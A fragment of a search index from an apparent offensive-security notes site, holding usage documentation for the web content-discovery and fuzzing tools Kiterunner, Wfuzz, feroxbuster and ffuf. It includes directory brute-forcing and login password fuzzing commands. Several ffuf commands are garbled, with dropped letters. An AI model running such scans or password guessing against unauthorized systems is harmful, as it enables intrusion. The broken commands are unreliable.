from the links below:</p> <ul> <li>routes-large.kite (40MB compressed, 183M decompressed)</li> <li>routes-small.kite (2MB compressed, 35MB decompressed)</li> </ul>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/Kiterunner/#usage","title":"Usage","text":""},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/Kiterunner/#quick-start","title":"Quick Start","text":"<pre><code>kr [scan|brute] &lt;input&gt; [flags]\n</code></pre> <p><code>&lt;input&gt;</code> can be a file, a domain, or URI. we'll figure it out for you. See  Input/Host Formatting for more details</p> <pre><code># Just have a list of hosts and no wordlist\nkr scan hosts.txt -A=apiroutes-210328:20000 -x 5 -j 100 --fail-status-codes 400,401,404,403,501,502,426,411\n\n# You have your own wordlist but you want assetnote wordlists too\nkr scan target.com -w routes.kite -A=apiroutes-210328:20000 -x 20 -j 1 --fail-status-codes 400,401,404,403,501,502,426,411\n\n# Bruteforce like normal but with the first 20000 words\nkr brute https://target.com/subapp/ -A=aspx-210328:20000 -x 20 -j 1\n\n# Use a dirsearch style wordlist with %EXT%\nkr brute https://target.com/subapp/ -w dirsearch.txt -x 20 -j 1 -exml,asp,aspx,ashx -D\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/Kiterunner/#cli-help","title":"CLI Help","text":"<pre><code>Usage:\n  kite scan [flags]\n\nFlags:\n  -A, --assetnote-wordlist strings    use the wordlists from wordlist.assetnote.io. specify the type/name to use, e.g. apiroutes-210228. You can specify an additional maxlength to use only the first N values in the wordlist, e.g. apiroutes-210228;20000 will only use the first 20000 lines in that wordlist\n      --blacklist-domain strings      domains that are blacklisted for redirects. We will not follow redirects to these domains\n      --delay duration                delay to place inbetween requests to a single host\n      --disable-precheck              whether to skip host discovery\n      --fail-status-codes ints        which status codes blacklist as fail. if this is set, this will override success-status-codes\n      --filter-api strings            only scan apis matching this ksuid\n      --force-method string           whether to ignore the methods specified in the ogl file and force this method\n  -H, --header strings                headers to add to requests (default [x-forwarded-for: 127.0.0.1])\n  -h, --help                          help for scan\n      --ignore-length strings         a range of content length bytes to ignore. you can have multiple. e.g. 100-105 or 1234 or 123,34-53. This is inclusive on both ends\n      --kitebuilder-full-scan         perform a full scan without first performing a phase scan.\n  -w, --kitebuilder-list strings      ogl wordlist to use for scanning\n  -x, --max-connection-per-host int   max connections to a single host (default 3)\n  -j, --max-parallel-hosts int        max number of concurrent hosts to scan at once (default 50)\n      --max-redirects int             maximum number of redirects to follow (default 3)\n  -d, --preflight-depth int           when performing preflight checks, what directory depth do we attempt to check. 0 means that only the docroot is checked (default 1)\n      --profile-name string           name for profile output file\n      --progress                      a progress bar while scanning. by default enabled only on Stderr (default true)\n      --quarantine-threshold int      if the host return N consecutive hits, we quarantine the host as wildcard. Set to 0 to disable (default 10)\n      --success-status-codes ints     which status codes whitelist as success. this is the default mode\n  -t, --timeout duration              timeout to use on all requests (default 3s)\n      --user-agent string             user agent to use for requests (default \"Chrome. Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36\")\n      --wildcard-detection            can be set to false to disable wildcard redirect detection (default true)\n\nGlobal Flags:\n      --config string    config file (default is $HOME/.kiterunner.yaml)\n  -o, --output string    output format. can be json,text,pretty (default \"pretty\")\n  -q, --quiet            quiet mode. will mute unecessarry pretty text\n  -v, --verbose string   level of logging verbosity. can be error,info,debug,trace (default \"info\")\n</code></pre> <p>bruteforce flags (all the flags above +)</p> <pre><code>  -D, --dirsearch-compat              this will replace %EXT% with the extensions provided. backwards compat with dirsearch because shubs loves him some dirsearch\n  -e, --extensions strings            extensions to append while scanning\n  -w, --wordlist strings              normal wordlist to use for scanning\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/Kiterunner/#inputhost-formatting","title":"Input/Host Formatting","text":"<p>When supplied with an input, kiterunner will attempt to resolve the input in the following order: 1. Is the input a file. If so read all the lines in the file as separate domains 2. The input is treated as a \"domain\"</p> <p>If you supply a \"domain\", but it exists as a file, e.g. <code>google.com</code> but <code>google.com</code> is also a txt file in the current directory, we'll load <code>google.com</code> the text file, because we found it first.</p> <p>Domain Parsing</p> <p>Its preferred that you provide a full URI as the input, however you can provide incomplete URIs and we'll try and guess what you mean. An example list of domains you can supply are:</p> <pre><code>one.com\ntwo.com:80\nthree.com:443\nfour.com:9447\nhttps://five.com:9090\nhttp://six.com:80/api\n</code></pre> <p>The above list of domains will expand into the subsequent list of targets</p> <pre><code>(two targets are created for one.com, since neither port nor protocol was specified)\nhttp://one.com (port 80 implied)\nhttps://one.com (port 443 implied)\n\nhttp://two.com (port 80 implied)\nhttps://three.com (port 443 implied)\nhttp://four.com:9447 (non-tls port guessed)\nhttps://five.com:9090\nhttp://six.com/api (port 80 implied; basepath API appended)\n</code></pre> <p>The rules we apply are:</p> <ul> <li>if you supply a scheme, we use the scheme.</li> <li>We only support http &amp; https</li> <li>if you don't supply a scheme, we'll guess based on the port</li> <li>if you supply a port, we'll use the port</li> <li>If your port is 443, or 8443, we'll assume its tls</li> <li>if you don't supply a port, we'll guess both port 80, 443</li> <li>if you supply a path, we'll prepend that path to all requests against that host</li> </ul>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/Kiterunner/#api-scanning","title":"API Scanning","text":"<p>When you have a single target</p> <pre><code># single target\nkr scan https://target.com:8443/ -w routes.kite -A=apiroutes-210228:20000 -x 10 --ignore-length=34\n\n# single target, but you want to try http and https\nkr scan target.com -w routes.kite -A=apiroutes-210228:20000 -x 10 --ignore-length=34\n\n# a list of targets\nkr scan targets.txt -w routes.kite -A=apiroutes-210228:20000 -x 10 --ignore-length=34\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/Kiterunner/#vanilla-bruteforcing","title":"Vanilla Bruteforcing","text":"<pre><code>kr brute https://target.com -A=raft-large-words -A=apiroutes-210228:20000 -x 10 -d=0 --ignore-length=34 -ejson,txt\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/Kiterunner/#dirsearch-bruteforcing","title":"Dirsearch Bruteforcing","text":"<p>For when you have an old-school wordlist that still has %EXT% in the wordlist, you can use <code>-D</code>. this will only substitute the extension where %EXT% is present in the path</p> <pre><code>kr brute https://target.com -w dirsearch.txt -x 10 -d=0 --ignore-length=34 -ejson,txt -D\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/Kiterunner/#technical-features","title":"Technical Features","text":""},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/Kiterunner/#depth-scanning","title":"Depth Scanning","text":"<p>A key feature of kiterunner is depth based scanning. This attempts to handle detecting wildcards given virtual application path based routing. The depth defines how many directories deep the baseline checks are performed E.g.</p> <pre><code>~/kiterunner $ cat wordlist.txt\n\n/api/v1/user/create\n/api/v1/user/delete\n/api/v2/user/\n/api/v2/admin/\n/secrets/v1/\n/secrets/v2/\n</code></pre> <ul> <li>At depth 0, only <code>/</code> would have the baseline checks performed for wildcard detection</li> <li>At depth 1, <code>/api</code> and <code>/secrets</code> would have baseline checks performed; and these checks would be used against <code>/api</code> and <code>/secrets</code> correspondingly</li> <li>At depth 2, <code>/api/v1</code>, <code>/api/v2</code>, <code>/secrets/v1</code> and <code>/secrets/v2</code> would all have baseline checks performed.</li> </ul> <p>By default, <code>kr scan</code> has a depth of 1, since from internal usage, we've often seen this as the most common depth where virtual routing has occured. <code>kr brute</code> has a default depth of 0, as you typically don't want this check to be performed with a static wordlist.</p> <p>Naturally, increasing the depth will increase the accuracy of your scans, however this also increases the number of requests to the target. (<code># of baseline checks * # of depth baseline directories</code>). Hence, we recommend against going above 1, and in rare cases going to depth 2.</p>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/Kiterunner/#using-assetnote-wordlists","title":"Using Assetnote Wordlists","text":"<p>We provide inbuilt downloading and caching of wordlists from assetnote.io. You can use these with the <code>-A</code> flag which receives a comma delimited list of aliases, or fullnames.</p> <p>You can get a full list of all the Assetnote wordlists with <code>kr wordlist list</code>. </p> <p>The wordlists when used, are cached in <code>~/.cache/kiterunner/wordlists</code>. When used, these are compiled from <code>.txt</code> -&gt; <code>.kite</code> </p> <pre><code>+-----------------------------------+-------------------------------------------------------+----------------+---------+----------+--------+\n|               ALIAS               |                       FILENAME                        |     SOURCE     |  COUNT  | FILESIZE | CACHED |\n+-----------------------------------+-------------------------------------------------------+----------------+---------+----------+--------+\n| 2m-subdomains                     | 2m-subdomains.txt                                     | manual.json    | 2167059 | 28.0mb   | false  |\n| asp_lowercase                     | asp_lowercase.txt                                     | manual.json    |   24074 | 1.1mb    | false  |\n| aspx_lowercase                    | aspx_lowercase.txt                                    | manual.json    |   80293 | 4.4mb    | false  |\n| bak                               | bak.txt                                               | manual.json    |   31725 | 634.8kb  | false  |\n| best-dns-wordlist                 | best-dns-wordlist.txt                                 | manual.json    | 9996122 | 139.0mb  | false  |\n| cfm                               | cfm.txt                                               | manual.json    |   12100 | 260.3kb  | true   |\n| do                                | do.txt                                                | manual.json    |  173152 | 4.8mb    | false  |\n| dot_filenames                     | dot_filenames.txt                                     | manual.json    | 3191712 | 71.3mb   | false  |\n| html                              | html.txt                                              | manual.json    | 4227526 | 107.7mb  | false  |\n| apiroutes-201120                  | httparchive_apiroutes_2020_11_20.txt                  | automated.json |  953011 | 45.3mb   | false  |\n| apiroutes-210128                  | httparchive_apiroutes_2021_01_28.txt                  | automated.json |  225456 | 6.6mb    | false  |\n| apiroutes-210228                  | httparchive_apiroutes_2021_02_28.txt                  | automated.json |  223544 | 6.5mb    | true   |\n| apiroutes-210328                  | httparchive_apiroutes_2021_03_28.txt                  | automated.json |  215114 | 6.3mb    | false  |\n| aspx-201118                       | httparchive_aspx_asp_cfm_svc_ashx_asmx_2020_11_18.txt | automated.json |   63200 | 1.7mb    | false  |\n| aspx-210128                       | httparchive_aspx_asp_cfm_svc_ashx_asmx_2021_01_28.txt | automated.json |   46286 | 928.7kb  | false  |\n| aspx-210228                       | httparchive_aspx_asp_cfm_svc_ashx_asmx_2021_02_28.txt | automated.json |   43958 | 883.3kb  | false  |\n| aspx-210328                       | httparchive_aspx_asp_cfm_svc_ashx_asmx_2021_03_28.txt | automated.json |   45928 | 926.8kb  | false  |\n| cgi-201118                        | httparchive_cgi_pl_2020_11_18.txt                     | automated.json |    2637 | 44.0kb   | false  |\n\n&lt;SNIP&gt;\n</code></pre> <p>Usage</p> <pre><code>kr scan targets.txt -A=apiroutes-210228 -x 10 --ignore-length=34\nkr brute targets.txt -A=aspx-210228 -x 10 --ignore-length=34 -easp,aspx\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/Kiterunner/#head-syntax","title":"Head Syntax","text":"<p>When using assetnote provided wordlists, you may not want to use the entire wordlist, so you can opt to use the first N lines in a given wordlist using the <code>head syntax</code>. The format is <code>&lt;wordlist_name&gt;:&lt;N lines&gt;</code> when specifying a wordlist.</p> <p>Usage</p> <pre><code># this will use the first 20000 lines in the api routes wordlist\nkr scan targets.txt -A=apiroutes-210228:20000 -x 10 --ignore-length=34\n\n# this will use the first 10 lines in the aspx wordlist\nkr brute targets.txt -A=aspx-210228:10 -x 10 --ignore-length=34 -easp,aspx\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/Kiterunner/#concurrency-settingsgoing-fast","title":"Concurrency Settings/Going Fast","text":"<p>Kiterunner is made to go fast on a lot of hosts. But, just because you can run kiterunner at 20000 goroutines, doesn't mean its a good idea. Bottlenecks and performance degredation will occur at high thread counts due to more time spent scheduling goroutines that are waiting on network IO and kernel context switching.</p> <p>There are two main concurrency settings for kiterunner: - <code>-x, --max-connection-per-host</code> - maximum number of open connections we can have on a host. Governed by 1 goroutine each. To avoid DOS'ing a host, we recommend keeping this in a low realm of 5-10. Depending on latency to the target, this will yield on average between 1-5 requests per second per connection (200ms - 1000ms/req) to a host. - <code>-j, --max-parallel-hosts</code> - maximum number of hosts to scan at any given time. Governed by 1 goroutine supervisor for each</p> <p>Depending on the hardware you are scanning from, the \"maximum\" number of goroutines you can run optimally will vary. On an AWS t3.medium, we saw performance degradation going over 2500 goroutines. Meaning, 500 hosts x 5 conn per host (2500) would yield peak performance.</p> <p>We recommend against running kiterunner from your macbook. Due to poor kernel optimisations for high IO counts and Epoll syscalls on macOS, we noticed substantially poorer (0.3-0.5x) performance when compared to running kiterunner on a similarly configured linux instance.</p> <p>To maximise performance when scanning an individual target, or a large attack surface we recommend the following tips: - Spin up an EC2 instance in a similar geographic region/datacenter to the target(s) you are scanning - Perform some initial benchmarks against your target set with varying <code>-x</code> and <code>-j</code> options. We recommend having a typical starting point of around <code>-x 5 -j 100</code> and moving <code>-j</code> upwards as your CPU usage/network performance permits</p>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/Kiterunner/#converting-between-file-formats","title":"Converting between file formats","text":"<p>Kiterunner will also let you convert between the schema JSON, a kite file and a standard txt wordlist. </p> <p>Usage</p> <p>The format is decided by the filetype extension supplied by the <code>&lt;input&gt;</code> and <code>&lt;output&gt;</code> fields. We support <code>txt</code>, <code>json</code> and <code>kite</code></p> <pre><code>kr kb convert wordlist.txt wordlist.kite\nkr kb convert wordlist.kite wordlist.json\nkr kb convert wordlist.kite wordlist.txt\n</code></pre> <pre><code>\u276f go run ./cmd/kiterunner kb convert -qh\nconvert an input file format into the specified output file format\n\nthis will determine the conversion based on the extensions of the input and the output\nwe support the following filetypes: txt, json, kite\nYou can convert any of the following into the corresponding types\n\n-d Debug mode will attempt to convert the schema with error handling\n-v=debug Debug verbosity will print out the errors for the schema\n\nUsage:\nkite kb convert &lt;input&gt; &lt;output&gt; [flags]\n\nFlags:\n-d, --debug   debug the parsing\n-h, --help    help for convert\n\nGlobal Flags:\n--config string    config file (default is $HOME/.kiterunner.yaml)\n-o, --output string    output format. can be json,text,pretty (default \"pretty\")\n-q, --quiet            quiet mode. will mute unecessarry pretty text\n-v, --verbose string   level of logging verbosity. can be error,info,debug,trace (default \"info\")``bigquery\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/Kiterunner/#replaying-requests","title":"Replaying requests","text":"<p>When you receive a bunch of output from kiterunner, it may be difficult to immediately understand why a request is causing a specific response code/length. Kiterunner offers a method of rebuilding the request from the wordlists used including all the header and body parameters.</p> <ul> <li>You can replay a request by copy pasting the full response output into the <code>kb replay</code> command. </li> <li>You can specify a <code>--proxy</code> to forward your requests through, so you can modify/repeat/intercept the request using 3rd party tools if you wish</li> <li>The golang net/http client will perform a few additional changes to your request due to how the default golang spec implementation (unfortunately).</li> </ul> <pre><code>\u276f go run ./cmd/kiterunner kb replay -q --proxy=http://localhost:8080 -w routes.kite \"POST    403 [    287,   10,   1] https://target.com/dedalo/lib/dedalo/publication/server_api/v1/json/thesaurus_parents 0cc39f76702ea287ec3e93f4b4710db9c8a86251\"\n11:25AM INF Raw reconstructed request\nPOST /dedalo/lib/dedalo/publication/server_api/v1/json/thesaurus_parents?ar_fields=48637466&amp;code=66132381&amp;db_name=08791392&amp;lang=lg-eng&amp;recursive=false&amp;term_id=72336471 HTTP/1.1\nContent-Type: any\n\n\n11:25AM INF Outbound request\nPOST /dedalo/lib/dedalo/publication/server_api/v1/json/thesaurus_parents?ar_fields=48637466&amp;code=66132381&amp;db_name=08791392&amp;lang=lg-eng&amp;recursive=false&amp;term_id=72336471 HTTP/1.1\nHost: target.com\nUser-Agent: Go-http-client/1.1\nContent-Length: 0\nContent-Type: any\nAccept-Encoding: gzip\n\n\n11:25AM INF Response After Redirects\nHTTP/1.1 403 Forbidden\nConnection: close\nContent-Length: 45\nContent-Type: application/json\nDate: Wed, 07 Apr 2021 01:25:28 GMT\nX-Amzn-Requestid: 7e6b2ea1-c662-4671-9eaa-e8cd31b463f2\n\nUser is not authorized to perform this action\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/Kiterunner/#technical-implementation","title":"Technical Implementation","text":""},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/Kiterunner/#intermediate-data-type-proutes","title":"Intermediate Data Type (PRoutes)","text":"<p>We use an intermediate representation of wordlists and kitebuilder json schemas in kiterunner. This is to allow us to dynamically generate the fields in the wordlist and reconstruct request bodies/headers and query parameters from a given spec.</p> <p>The PRoute type is composed of Headers, Body, Query and Cookie parameters that are encoded in <code>pkg/proute.Crumb</code>. The Crumb type is an interface that is implemented on types such as UUIDs, Floats, Ints, Random Strings, etc.</p> <p>When performing conversions to and from txt, json and kite files, all the conversions are first done to the <code>proute.API</code> intermediate type. Then the corresponding encoding is written out</p>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/Kiterunner/#kite-file-format","title":"Kite File Format","text":"<p>We use a super secret kite file format for storing the json schemas from kitebuilder. These are simply protobuf encoded <code>pkg/proute.APIS</code> written to a file. The compilation is used to allow us to quickly deserialize the already parsed wordlist. This file format is not stable, and should only be interacted with using the inbuilt conversion tools for kiterunner.</p> <p>When a new version of the kite file format is released, you may need to recompile your kite files</p>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/Wfuzz/","title":"Wfuzz","text":"<p>wfuzz github</p> <pre><code>#looking for common directories\nwfuzz -w wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ\n\n#looking for common files:\nwfuzz -w wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ.php\n\n#Fuzzing Parameters In URLs\nwfuzz -z range,0-10 --hl 97 http://testphp.vulnweb.com/listproducts.php?cat=FUZZ\n\n#Fuzzing POST Requests\nwfuzz -z file,wordlist/others/common_pass.txt -d \"uname=FUZZ&amp;pass=FUZZ\"  --hc 302 http://testphp.vulnweb.com/userinfo.php\n\n#Fuzzing Cookies\nwfuzz -z file,wordlist/general/common.txt -b cookie=value1 -b cookie2=value2 http://testphp.vulnweb.com/FUZZ\n\nwfuzz -z file,wordlist/general/common.txt -b cookie=FUZZ http://testphp.vulnweb.com/\n\n#Fuzzing Custom headers\nwfuzz -z file,wordlist/general/common.txt -H \"myheader: headervalue\" -H \"myheader2: headervalue2\" http://testphp.vulnweb.com/FUZZ\n\n#You can modify existing headers, for specifying a custom user agent\nwfuzz -z file,wordlist/general/common.txt -H \"myheader: headervalue\" -H \"User-Agent: Googlebot-News\" http://testphp.vulnweb.com/FUZZ\n\n#Fuzzing HTTP Verbs\nwfuzz -z list,GET-HEAD-POST-TRACE-OPTIONS -X FUZZ http://testphp.vulnweb.com/\n\n#Authentication\nwfuzz -z list,nonvalid-httpwatch --basic FUZZ:FUZZ https://www.httpwatch.com/httpgallery/authentication/authenticatedimage/default.aspx\n\n#Recursion\nwfuzz -z list,\"admin-CVS-cgi\\-bin\"  -R1 http://testphp.vulnweb.com/FUZZ\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/Wfuzz/#installation","title":"Installation","text":"<p>To install WFuzz, simply use pip:</p> <pre><code>pip install wfuzz\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/Wfuzz/#to-run-wfuzz-from-a-docker-image-run","title":"To run Wfuzz from a docker image, run:","text":"<pre><code>$ docker run -v $(pwd)/wordlist:/wordlist/ -it ghcr.io/xmendez/wfuzz wfuzz\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/Wfuzz/#documentation","title":"Documentation","text":"<p>Documentation is available at http://wfuzz.readthedocs.io</p>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/Wfuzz/#download","title":"Download","text":"<p>Check github releases. Latest is available at https://github.com/xmendez/wfuzz/releases/latest</p>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/Wfuzz/#resources","title":"resources","text":"<ul> <li>https://www.hackingarticles.in/a-detailed-guide-on-wfuzz/</li> <li>https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/WFUZZ%20for%20Penetration%20Testers.pdf</li> </ul>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/froxbuster/","title":"froxbuster","text":"<ul> <li>froxbuster</li> <li>official documentation</li> </ul>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/froxbuster/#install","title":"install","text":"<pre><code>sudo apt update &amp;&amp; sudo apt install -y feroxbuster\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/froxbuster/#update","title":"update","text":"<pre><code>./feroxbuster --update\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/froxbuster/#multiple-values","title":"Multiple Values","text":"<ul> <li>Options that take multiple values are very flexible.</li> <li>Consider the following ways of specifying extensions: The command adds .pdf, .js, .html, .php, .txt, .json, and .docx to each url</li> <li>All of the methods (multiple flags, space separated, comma separated, etc...) are valid and interchangeable. The same goes for urls, headers, status codes, queries, and size filters.</li> </ul> <pre><code>./feroxbuster -u http://127.1 -x pdf -x js,html -x php txt json,docx\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/froxbuster/#include-headers","title":"Include Headers","text":"<pre><code>./feroxbuster -u http://127.1 -H Accept:application/json \"Authorization: Bearer {token}\"\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/froxbuster/#ipv6-non-recursive-scan-with-info-level-logging-enabled","title":"IPv6, non-recursive scan with INFO-level logging enabled","text":"<pre><code>./feroxbuster -u http://[::1] --no-recursion -vv\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/froxbuster/#read-urls-from-stdin-pipe-only-resulting-urls-out-to-another-tool","title":"Read urls from STDIN; pipe only resulting urls out to another tool","text":"<pre><code>cat targets | ./feroxbuster --stdin --silent -s 200 301 302 --redirects -x js | fff -s 200 -o js-files\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/froxbuster/#proxy-traffic-through-burp","title":"Proxy traffic through Burp","text":"<pre><code>./feroxbuster -u http://127.1 --insecure --proxy http://127.0.0.1:8080\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/froxbuster/#proxy-traffic-through-a-socks-proxy-including-dns-lookups","title":"Proxy traffic through a SOCKS proxy (including DNS lookups)","text":"<pre><code>./feroxbuster -u http://127.1 --proxy socks5h://127.0.0.1:9050\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/froxbuster/#pass-auth-token-via-query-parameter","title":"Pass auth token via query parameter","text":"<pre><code>./feroxbuster -u http://127.1 --query token=0123456789ABCDEF\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/fuff/","title":"fuff","text":"<p>fuff</p>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/fuff/#installation-configuration","title":"Installation &amp; Configuration","text":""},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/fuff/#install","title":"Install","text":"<p>Ffuf depends on Go 1.16 or greater</p> <pre><code>git clone https://github.com/ffuf/ffuf ; cd ffuf ; go get ; go build\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/fuff/#configuration-files","title":"Configuration files","text":"<p>When running ffuf, it first checks if a default configuration file exists.      efault path for a ffufrc file is $XDG_CONFIG_HOME/ffuf/ffufrc. You can       onfigure one or multiple options in this file, and they will be applied on      very subsequent ffuf job. An example of ffufrc file can be found here. A more detailed description about configuration file locations can be     found   n the wiki: https://github.com/ffuf/ffuf/wiki/Configuration</p>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/fuff/#commands","title":"Commands","text":""},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/fuff/#fuzz-keyword-at-the-end-of-url-u","title":"FUZZ keyword at the end of URL (-u)","text":"<pre><code>ffuf -w /path/to/wordlist -u https://target/FUZZ\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/fuff/#virtual-host-discovery-without-dns-records","title":"Virtual host discovery (without DNS records)","text":"<p>Assuming that the default virtualhost response size is 4242 bytes, we can       ilter out all the responses of that size (-fs 4242)while fuzzing the     Host    header:</p> <pre><code>ffuf -w /path/to/vhost/wordlist -u https://target -H \"Host: FUZZ\" -fs 4242\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/fuff/#get-parameter-fuzzing","title":"GET parameter fuzzing","text":"<p>similar to directory discovery, and works by defining the FUZZ keyword as     a   art of the URL. This also assumes a response size of 4242 bytes for       nvalid GET parameter name.</p> <pre><code>ffuf -w /path/to/paramnames.txt -u https://target/script.php?     UZZ=test_value -fs 4242\n</code></pre> <p>If the parameter name is known, the values can be fuzzed the same way.     This   xample assumes a wrong parameter value returning HTTP response code     401.</p> <pre><code>ffuf -w /path/to/values.txt -u https://target/script.php?valid_name=FUZZ      fc 401\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/fuff/#post-data-fuzzing","title":"POST data fuzzing","text":"<p>This is a very straightforward operation, again by using the FUZZ keyword.      his example is fuzzing only part of the POST request. We're again  iltering     out the 401 responses.</p> <pre><code>ffuf -w /path/to/postdata.txt -X POST -d \"username=admin\\&amp;password=FUZZ\"     -u   ttps://target/login.php -fc 401\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/fuff/#maximum-execution-time","title":"Maximum execution time","text":"<p>If you don't want ffuf to run indefinitely, you can use the -maxtime. This      tops the entire process after a given time (in seconds).</p> <pre><code>ffuf -w /path/to/wordlist -u https://target/FUZZ -maxtime 60\n</code></pre> <p>When working with recursion, you can control the maxtime per job using      maxtime-job. This will stop the current job after a given time (in       seconds) and continue with the next one. New jobs are created when the       recursion functionality detects a subdirectory.</p> <pre><code>ffuf -w /path/to/wordlist -u https://target/FUZZ -maxtime-job 60     -recursion   recursion-depth 2\n</code></pre> <p>It is also possible to combine both flags limiting the per job maximum      execution time as well as the overall execution time. If you do not use       recursion then both flags behave equally.</p>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/fuff/#switches-options-usage","title":"Switches | Options | Usage","text":"<p>To define the test case for ffuf, use the keyword FUZZ anywhere in the URL      -u), headers (-H), or POST data (-d).</p> <pre><code>Fuzz Faster U Fool - v2.1.0\nHTTP OPTIONS:\n  -H                  Header `\"Name: Value\"`, separated by colon. Multiple -H     flags are accepted.\n  -X                  HTTP method to use\n  -b                  Cookie data `\"NAME1=VALUE1; NAME2=VALUE2\"` for copy as    curl functionality.\n  -cc                 Client cert for authentication. Client key needs to be    defined as well for this to work\n  -ck                 Client key for authentication. Client certificate needs     to be defined as well for this to work\n  -d                  POST data\n  -http2              Use HTTP2 protocol (default: false)\n  -ignore-body        Do not fetch the response content. (default: false)\n  -r                  Follow redirects (default: false)\n  -raw                Do not encode URI (default: false)\n  -recursion          Scan recursively. Only FUZZ keyword is supported, and     URL (-u) has to end in it. (default: false)\n  -recursion-depth    Maximum recursion depth. (default: 0)\n  -recursion-strategy Recursion strategy: \"default\" for a redirect based, and     \"greedy\" to recurse on all matches (default: default)\n  -replay-proxy       Replay matched requests using this proxy.\n  -sni                Target TLS SNI, does not support FUZZ keyword\n  -timeout            HTTP request timeout in seconds. (default: 10)\n  -u                  Target URL\n  -x                  Proxy URL (SOCKS5 or HTTP). For example: http://127.0.0.    1:8080 or socks5://127.0.0.1:8080\nGENERAL OPTIONS:\n  -V                  Show version information. (default: false)\n  -ac                 Automatically calibrate filtering options (default:     false)\n  -acc                Custom auto-calibration string. Can be used multiple    times. Implies -ac\n  -ach                Per host autocalibration (default: false)\n  -ack                Autocalibration keyword (default: FUZZ)\n  -acs                Custom auto-calibration strategies. Can be used     